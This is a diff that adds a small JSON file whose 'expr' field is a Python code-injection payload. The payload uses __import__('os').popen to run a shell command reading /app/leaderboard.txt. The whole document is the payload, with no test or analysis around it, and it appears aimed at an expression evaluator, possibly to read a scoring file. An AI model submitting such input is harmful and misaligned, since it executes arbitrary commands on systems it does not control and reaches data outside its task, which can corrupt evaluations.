@@ -1,0 +1,3 @@
+{
+    "expr": "(lambda: __import__('os').popen('cat /app/leaderboard.txt').read())()"
+}
